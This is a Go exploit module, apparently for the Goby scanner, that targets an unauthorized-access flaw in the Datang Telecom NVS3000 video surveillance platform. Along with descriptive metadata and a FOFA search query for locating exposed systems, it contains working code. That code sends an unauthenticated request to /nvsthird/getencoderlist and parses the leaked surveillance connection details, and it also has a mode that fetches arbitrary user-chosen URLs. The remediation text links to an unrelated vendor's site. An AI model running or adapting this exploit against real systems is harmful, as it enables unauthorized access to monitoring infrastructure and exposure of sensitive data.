package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "DatangTelecom NVS3000 integratedVideo surveillancePlatform /nvsthird/getencoderlist Unauthorized Access Vulnerability",
    "Description": "<p>Datang Telecom NVS3000 integrated video surveillance platform is a remote video surveillance system based on broadband network for image monitoring, storage and management. The system combines the internal networks of telecom, Netcom and other operating enterprises, or other industries, enterprises and institutions, and realizes cross-domain, large-scale unified monitoring, storage, management and resource sharing, providing industry management decision makers with new, intuitive and expanded visual and auditory management tools to improve work performance. The system has unauthorized access vulnerabilities, and unauthorized attackers may obtain sensitive information.</p>",
    "Product": "Datang_Telecom-NVS3000",
    "Homepage": "https://www.datang.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-19",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"NVS3000综合视频监控平台\" && title==\"综合视频监控平台\"",
    "GobyQuery": "body=\"NVS3000综合视频监控平台\" && title==\"综合视频监控平台\"",
    "Level": "0",
    "Impact": "<p>The system has unauthorized access vulnerabilities. Unauthorized attackers may obtain sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version<a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "address_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "大唐电信NVS3000综合视频监控平台 /nvsthird/getencoderlist 未授权访问漏洞",
            "Product": "大唐电信-NVS3000",
            "Description": "<p>大唐电信NVS3000综合视频监控平台是一种基于宽带网络的图像监控、存储、管理的远程视频监控系统Q。该系统结合了电信、网通等运营企业、或其它行业、企事业单位的内部网络，实现了跨域、大范围的统一监控、存储、管理、资源共享，为行业管理决策者提供全新、直观、扩大视觉和听觉范围的管理工具，提高工作绩效。系统存在未授权访问漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本<a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>系统存在未授权访问漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "DatangTelecom NVS3000 integratedVideo surveillancePlatform /nvsthird/getencoderlist Unauthorized Access Vulnerability",
            "Product": "Datang_Telecom-NVS3000",
            "Description": "<p>Datang Telecom NVS3000 integrated video surveillance platform is a remote video surveillance system based on broadband network for image monitoring, storage and management. The system combines the internal networks of telecom, Netcom and other operating enterprises, or other industries, enterprises and institutions, and realizes cross-domain, large-scale unified monitoring, storage, management and resource sharing, providing industry management decision makers with new, intuitive and expanded visual and auditory management tools to improve work performance. The system has unauthorized access vulnerabilities, and unauthorized attackers may obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version<a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The system has unauthorized access vulnerabilities. Unauthorized attackers may obtain sensitive information.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9954"
}`

	postOrGet_HBk1KGUTcS := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		rawPayload := "{\"token\":\"\",\"fromindex\":0,\"toindex\":-1}"

		resp, err := setPostRequest(hostInfo, fileUrl, rawPayload, defineHeader)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/nvsthird/getencoderlist"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/nvsthird/getencoderlist": "\"address\":",
			}
			// 函数继承
			uploadFileFunc := postOrGet_HBk1KGUTcS

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"address_info": {"/nvsthird/getencoderlist", "\"address\":"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_HBk1KGUTcS

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular := `"(\w+)":"([^",]+)"`

			makeRegular := func(RegularContent string, RegularUrl string) ([]string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return nil, fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
				if len(getname) == 0 {
					return nil, fmt.Errorf("can't match value")
				}

				var results []string
				for _, v := range getname {
					results = append(results, v[1]+"="+v[2])
				}
				return results, nil
			}

			output, err := makeRegular(resp, regular)

			expResult.Success = true
			expResult.Output = "泄露信息：监控平台连接信息\n"
			for _, v := range output {
				expResult.Output += v + "\n"
			}
			return expResult
		},
	))
}
